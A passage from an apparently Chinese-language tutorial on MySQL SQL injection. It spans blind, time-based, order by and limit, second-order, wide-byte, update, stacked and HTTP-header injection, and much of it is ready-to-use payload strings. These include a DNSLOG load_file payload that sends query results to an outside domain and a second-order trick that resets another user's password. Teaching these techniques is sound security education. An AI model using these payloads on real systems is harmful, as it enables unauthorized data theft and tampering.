class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">-- -true  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">97</span> <span class="comment">-- -true  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --false  </span></span><br><span class="line"><span class="string">and ascii(substr(database(),1,1))=115 -- -true  </span></span><br><span class="line"><span class="string">-- 计算表的数量  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="operator">&gt;</span><span class="number">3</span> <span class="comment">-- true  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)&gt;4 --false  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="operator">=</span><span class="number">4</span> <span class="comment">--true  </span></span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol><li>盲注点确认后，我们一般不会取手动尝试一个字节一个字节的跑出来，而是采用工具比如sqlmap或者一些脚本来辅助我们，毕竟是属于重复无意义的工作，交给机器就好  </li><li>语句和之前其他查询都是类似，唯一的区别，就是盲注变成了一位一位字符的判断，不像之前那样一次性全部获取数据</li></ol><h3 id="扩展：基于正则的盲注"><a href="#扩展：基于正则的盲注" class="headerlink" title="扩展：基于正则的盲注"></a>扩展：基于正则的盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断user()是不是root开头  </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">&#x27;^root&#x27;</span>  </span><br></pre></td></tr></table></figure><h3 id="扩展：未知列名的盲注"><a href="#扩展：未知列名的盲注" class="headerlink" title="扩展：未知列名的盲注"></a>扩展：未知列名的盲注</h3><p>在知道表名，不知道列名的情况下，提供一种新的盲注方法  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="string">&#x27;aaa&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)<span class="operator">=</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">1</span>);  </span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>和布尔盲注显示，从名字也可以看出来，是依赖于响应时间上的差异来判断  </p><p>举个简单的例子：如果1&#x3D;1为真，就休眠5秒；这样页面返回的时间一定大于5秒  </p><p><strong>通常可利用的产生时间延迟的函数有：</strong> <code>sleep()</code>、<code>benchmark()</code>,还有许多进行复杂运算的函数也可以当作延迟的判断标准、笛卡尔积合并数据表、复杂正则表达式等等。  </p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>确实存在注入点，但无论输入什么内容，都显示一样的页面和内容；比如登录页面、用户信息采集模块等  </p><h3 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h3><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>if(1,2,3)</td><td>如果1位是True，就执行2，否则执行3</td></tr><tr><td>case when 1 then 2 else 3 end</td><td>同if</td></tr><tr><td>sleep(x)</td><td>延时x秒</td></tr><tr><td>benchmark(count,exp)</td><td>执行表达式exp，count次（消耗CPU）</td></tr></tbody></table><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果当前数据库的第一个字符是s，就延时2秒  </span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(substr((select database(),1,1) =&#x27;</span>s<span class="string">&#x27;,sleep(2)),0) --  </span></span><br><span class="line"><span class="string">-- 如果当前数据库group_concat连接后的表名第一个字符ascii码是101，就执行50000000次md5（&#x27;</span>a<span class="string">&#x27;）  </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">case</span> <span class="keyword">when</span> (ascii(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;secuity&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>) <span class="keyword">then</span> benchmark(<span class="number">50000000</span>,md5(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span> <span class="comment">--  </span></span><br><span class="line"><span class="comment">-- 如果查询出来的username第一个字符是D，就进行笛卡尔积运算  </span></span><br><span class="line">if(mid((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>&quot;D&quot;,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A,information_schema,columns B,information_schema.columns C),<span class="number">0</span>)  </span><br></pre></td></tr></table></figure><h1 id="DNS注入（简化盲注）"><a href="#DNS注入（简化盲注）" class="headerlink" title="DNS注入（简化盲注）"></a>DNS注入（简化盲注）</h1><p>也称为<strong>DNSLOG外带数据盲注</strong> ,主要是为了简化盲注，但是默认情况下无法使用，需要修改配置<code>secure-file-priv</code>  </p><h2 id="概念-4"><a href="#概念-4" class="headerlink" title="概念"></a>概念</h2><p>DNSLOG，简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问&#x2F;请求等操作，首先会取查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为<code>OBB（带外数据）</code>注入  </p><h2 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h2><ol><li>三大注入无法使用，或盲注跑数据太慢太慢  </li><li>有文件读取权限及<code>secure-file-priv</code> 无值(不为null)  </li><li>目标系统为Windows</li></ol><blockquote><p>为什么Windows可用，Linux不行？  </p><p>这里设计到一个UNC的知识点。简单的说，在Windows中，路径以\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在linux环境不适用。  </p><p>注：payload里的四个\中的两个\是用来进行转义处理的。  </p></blockquote><h2 id="利用语句"><a href="#利用语句" class="headerlink" title="利用语句"></a>利用语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.xxx.aa.ia\xxx&#x27;</span>))  </span><br></pre></td></tr></table></figure><h1 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h1><h2 id="概念-5"><a href="#概念-5" class="headerlink" title="概念"></a>概念</h2><p><code>order by</code>是mysql中对查询数据进行排序的方法，使用示例  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 默认排序asc  </span></span><br><span class="line"><span class="comment">-- 如果是数字，就对应到相关的列  </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 列明(数字) <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username；  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">desc</span>;  </span><br></pre></td></tr></table></figure><p><code>order by 注入</code> 通常出现在排序中，前端结果展示的表格，某一列需要进行升序或者降序排列，或则做排名比较的时候常常会用到<code>order by</code>排序，<code>order by</code>在select 语句中，紧跟在 <code>where [where condition]</code>后，且<code>order by</code>注入无法使用预编译来防御，由于<code>ordre by</code>后面需要紧跟<code>column_name</code>，而预编译是参数化字符串，而<code>order by</code> 后面紧跟字符串就会提示语法错误，因此通常防御<code>order by</code>注入需要使用白名单的方式。  </p><h2 id="判断存在"><a href="#判断存在" class="headerlink" title="判断存在"></a>判断存在</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 可以通过order by 列名，根据排序返回的情况来判断是否存在注入  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand()  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)  </span><br><span class="line"><span class="comment">-- 或者使用超大数或者返回多条记录，构成SQL语句错误  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">9999</span>  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>)  </span><br></pre></td></tr></table></figure><h2 id="利用语句-1"><a href="#利用语句-1" class="headerlink" title="利用语句"></a>利用语句</h2><p>\<br><code>order by</code><strong>通常情况下后面可直接接SQL语句</strong>，所以利用方式很多。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基于报错  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())x))  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())x)))  </span><br><span class="line"><span class="comment">-- 基于盲注  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables))  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables))  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> if(mid(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables))  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> if(mid(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables))  </span><br><span class="line"><span class="comment">-- 基于正则  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">select</span> <span class="number">1</span> regexp if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0x00</span>))  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> (<span class="keyword">select</span> <span class="number">1</span> regexp if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="number">0x00</span>))  <span class="comment">-- 基于rand  </span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(<span class="literal">true</span>)  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(<span class="literal">false</span>)  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(subsr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>)  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rand(subsr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>)  </span><br></pre></td></tr></table></figure><blockquote><p>如果使用<code>sleep()</code>函数，如果表里数据又<code>n</code>条，<code>sleep(2),</code>会使查询时间为<code>2*n</code>， 会对服务器造成拒绝服务攻击，一般不建议在order by处使用时间盲注来判断以及注入数据  </p><p>以上不完全正确。直接使用<code>order by sleep(2)</code>是如果使用子查询的话还是正常延迟  </p></blockquote><h1 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h1><p>此方法适用于MySQL5.x中，实测在8.0.27中会报错，在LIMIT后面可以跟两个函数，<code>PROCEDURE</code>和<code>INTO</code>，INTO除非又写入shell的权限，否则是无法利用的，所以就只能利用<code>PROCEDURE</code>  </p><blockquote><p>可能面试的时候会被问到：order by注入和limit注入有啥区别？<br><code>order by </code>注入后可以直接接SQL语句，而<code>limit</code>后面不行，需要再跟<code>procedure analyse()</code>才可以  </p></blockquote><p>其实也可以分为两种情况，一种是limit前有<code>order by</code>，一种是没有<code>order by</code>  </p><h2 id="无order-by"><a href="#无order-by" class="headerlink" title="无order by"></a>无order by</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> aaa limit <span class="number">1</span>,<span class="number">1</span>;  </span><br><span class="line"><span class="comment">-- 使用union注入  </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> aaa limit <span class="number">1</span>,<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> version();  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 报错注入，延时类似  </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> aaa limit <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse (extractvalue(rand(<span class="number">0</span>),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>);  </span><br></pre></td></tr></table></figure><h2 id="有order-by"><a href="#有order-by" class="headerlink" title="有order by"></a>有order by</h2><p>这个情况下就不能用union注入了，不然会抛出异常，所以用limit的专属方法，适用于5.0.0&lt;MySQL&lt;5.6.6  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> aaa <span class="keyword">order</span> <span class="number">1</span> limit <span class="number">1</span>,<span class="number">1</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 报错注入，延时类似  </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> aaa <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> limit ,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse (extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>);  </span><br></pre></td></tr></table></figure><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="概念-6"><a href="#概念-6" class="headerlink" title="概念"></a>概念</h2><p><strong>二次注入就是攻击者构造的恶意payload首先会被服务器存储再数据库中，在之后去除数据库再进行SQL语句拼接时产生的SQL注入问题。</strong>  </p><p>二次注入是sql注入的一种，但是比普通sql注入利用更困难，利用门槛高，普通注入数据直接进入到SQL查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到SQL查询。  </p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>创建用户时，使用<strong>mysql_escape_string</strong>来转义防注入。但是在拼接成SQL语句后再执行写入到数据库中时，会去掉转义添加的\而恢复之前的内容，使得的污染的数据写入到数据库中。如果有地方直接取出这个数据拼接到SQL语句中，就可能出现二次注入！  </p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>总结一下就是 <strong>恶意的SQL注入paload被存储到数据库中，然后后去操作过程中被直接拿出来拼接到其他SQL语句中，导致了二次注入。</strong>  </p><p>在这个例子中，我们可以控制的地方就在如下SQL语句中的<code>username</code>  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> password <span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$curr_pass&#x27;</span>  </span><br></pre></td></tr></table></figure><p>那我们只需要将<code>username</code>设置为一些比较明显效果的函数，比如<code>&#39; and sleep(5)#</code>就可以直观的看到较长的响应时间  </p><p>在这里因为还有一些其他的限制，我们可以尝试注释掉后面对原密码的验证的语句达到修改其他用户密码的目的。  </p><blockquote><p>实战中如果不是特别有把握尽量不要使用<code>update</code>注入，毕竟会对目标的数据进行修改  </p></blockquote><ul><li>注册用户<code>test&#39;#</code>并登录，修改密码，这里可构造SQL语句如下，执行后test用户的密码被修改  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> password <span class="operator">=</span><span class="string">&#x27;123123&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span> <span class="string">&#x27;test&#x27;</span>#<span class="string">&#x27; and password=&#x27;</span><span class="number">1111</span><span class="string">&#x27;  </span></span><br></pre></td></tr></table></figure></li></ul><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h2><p><code>magic_quotes_gpc</code>函数在php中的作用是判断解析用户提交的数据，如果<code>magic_quiotes_gpc=on</code>,PHP解析器就会自动为post、get、cookie过来的数据增加转义字符,以确保这些输入不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。  </p><p>在<code>magic_quotes_gpc</code>为on 的情况下，<strong>如果输入的数据有单引号、双引号、反斜线、与null等字符，都会被加上反斜线，</strong> 这些转义是必须的，如果这个选项为off，那么我们就必须调用addslashes这个函数来为字符串增加转义.  </p><h2 id="编码字符集"><a href="#编码字符集" class="headerlink" title="编码字符集"></a>编码字符集</h2><p>单字节字符集：所有的字符都使用一个字节来表示，比如asscii编码。  </p><p>多字节字符集：在多个字符集中，一部分字节用多个字节来表示。  </p><p>UTF-8编码：是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。  </p><p>常见的宽字节：GB2312、GBK、GB18030、BIG5、Shitf_JIS  </p><p>GBK编码：是一种多字符编码；它使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用两个字节。如：你好–&gt;C4E3 BAC3,经过url编码后%C4%E3%BA%C3，可以看出一个字是两个字节著称  </p><h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>\<span class="string">&#x27;#;  </span></span><br><span class="line"><span class="string">-- 如果编码设置  </span></span><br><span class="line"><span class="string">mysql_query(&quot;SET NAMES gbk&quot;);  </span></span><br><span class="line"><span class="string">/*  </span></span><br><span class="line"><span class="string">SET character_set_client =&#x27;</span>gbk<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">SET character_set_results =&#x27;</span>gbk<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">SET character_set_connection =&#x27;</span>gbk<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">*/  </span></span><br><span class="line"><span class="string">id=1%df%27 and 1=1 %23  </span></span><br><span class="line"><span class="string"># 不一定非得%df，%99、%aa、%fe等都可以  </span></span><br></pre></td></tr></table></figure><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤，但是由于一些不经意的字符集转换，又会导致漏洞<br>使用 set name utf-8指定utf-8字符集，并且也使用转义函数进行转义。有时候为了避免乱码，会将一些用户提交的GBK字符使用iconv()函数先转为UTF-8，然后拼接SQL语句  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>e5<span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">27</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+  </span></span><br></pre></td></tr></table></figure><h1 id="Update-注入"><a href="#Update-注入" class="headerlink" title="Update 注入"></a>Update 注入</h1><p>和其他注入一样，无非是闭合语句，然后注入自己的恶意语句，达到自己想要的效果，比如修改密码、查询数据等等  </p><blockquote><p>update注入一般给敏感数据如database()的值设置到可见变量中，然后直接查看  </p></blockquote><p>这里单独列出来一个点，就是update注入点如何重复给字段赋值  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 正常update，sqli处为注入点  </span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> username<span class="operator">=</span>&quot;sqli&quot; <span class="keyword">where</span> age<span class="operator">=</span><span class="number">111</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 重复给username赋值  </span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> username<span class="operator">=</span>&quot;sqli&quot;,username<span class="operator">=</span><span class="keyword">user</span>() <span class="keyword">where</span> age<span class="operator">=</span><span class="number">111</span>;  </span><br></pre></td></tr></table></figure><p>False 注入  </p><blockquote><p>算是盲注内的一种利用手法，不过感觉用到的情况很少很少，个人感觉主要用到and&#x2F;or被过滤的情况  </p></blockquote><p>Mysql也是隐私式类型转换，和php一样  </p><p>简单来说就是给字符串转换为数字的时候，会自动从前往后判断，如果最前面是数字，比如1abc最前面是1，那么就会转换成对应的数字，这个地方就是1，如果前面是字母就会转换成0  </p><ul><li>mid(database(),1,1)&#x3D;’t’ &#x3D;&#x3D;&gt;1  </li><li>‘aaa’^(mid(database(),1,1)&#x3D;’t’) &#x3D;&#x3D;&gt;’aaa’^1&#x3D;&#x3D;&gt;0^1&#x3D;&#x3D;&gt;1  </li><li>‘aaa’^(mid(database(),1,1)&#x3D;’t’)&#x3D;1&#x3D;&#x3D;&gt;1&#x3D;1&#x3D;&#x3D;&gt;1</li></ul><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>堆叠注入与受限于select语句的其他注入不同，堆叠主可用于执行任意SQL语句。  </p><p>简单的说，由于分号; 为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等  </p><p><strong>注意：</strong> 通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。因此读取数据时建议使用union联合注入，若无法使用联合注入，可考虑使用RENAME关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名。  </p><h1 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h1><ul><li>HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤就直接带入SQL语句中，从而产生注入。  </li><li>HTTP头注入常常发生在程序采集用户信息的模块中  <blockquote><p>是否可能存在注入，只需要记住一句话：<strong>所有和数据库存在交互的地方，都可能存在SQL注入</strong></p></blockquote></li></ul><p><strong>常见的HTTP头：</strong>  </p><table><thead><tr><th>header</th><th>说明</th></tr></thead><tbody><tr><td>Accept</td><td>浏览器能够处理的内容类型</td></tr><tr><td>Accept-Charset</td><td>浏览器能够显示的字符集</td></tr><tr><td>Accept-Encoding</td><td>浏览器能处理的压缩编码</td></tr><tr><td>Accept-Laguage</td><td>浏览器当前设置的语言</td></tr><tr><td>Connection</td><td>浏览器与服务器之间的连接</td></tr><tr><td>cookie</td><td>当前页面所设置的cookie</td></tr><tr><td>Host</td><td>发出请求的页面所在域</td></tr><tr><td>Referer</td><td>发出请求的页面URL</td></tr><tr><td>User-agent</td><td>浏览器用户代理字符串</td></tr><tr><td>Server</td><td>web服务器表明白自己是说明软件及版本信息</td></tr></tbody></table><p><strong>常见的注入点：</strong><br>因为http头注入常出现在收集用户信息的点，所以常见的注入点如下：  </p><table><thead><tr><th>herder</th><th>说明</th></tr></thead><tbody><tr><td>X-Forwarded-For</td><td>用户IP</td></tr><tr><td>User-Agent</td><td>用户代理的设备信息</td></tr><tr><td>Referer</td><td>告诉服务器该网页从哪个页面连接过来</td></tr><tr><td>Cookie</td><td>标识用户的身份信息</td></tr></tbody></table><h1 id="其他：文件读写"><a href="#其他：文件读写" class="headerlink" title="其他：文件读写"></a>其他：文件读写</h1><h2 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h2><p>file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过SQL语句查询  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span>$<span class="keyword">USER</span> <span class="keyword">and</span> host<span class="operator">=</span>$HOST;  </span><br><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span>&quot;root&quot; <span class="keyword">and</span> host <span class="operator">=</span>&quot;localhost&quot;  </span><br><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql.user limit <span class="number">1</span>)<span class="keyword">and</span> host<span class="operator">=</span>(<span class="keyword">select</span> host <span class="keyword">from</span> mysql.user limit <span class="number">1</span>)  </span><br></pre></td></tr></table></figure><p>secure-file-priv 是一个系统变量，对于文件读&#x2F;写功能进行限制。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;  </span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;%secure_file_priv%&quot;  </span><br></pre></td></tr></table></figure><ul><li><p>值具体说明：  </p><ul><li>为NULL，表示禁止文件读&#x2F;写  </li><li>空白内容，表示无限制  </li><li>为目录名，表示仅允许对特定目录进行读&#x2F;写。  <blockquote><p>Mysql&gt;&#x3D;5.5.53版本默认值为NULL，之前的版本为空白内容。</p></blockquote></li></ul></li><li><p>修改secure-file-priv值：  </p><ul><li>通过修改my.ini文件，添加：secure-file-priv&#x3D;  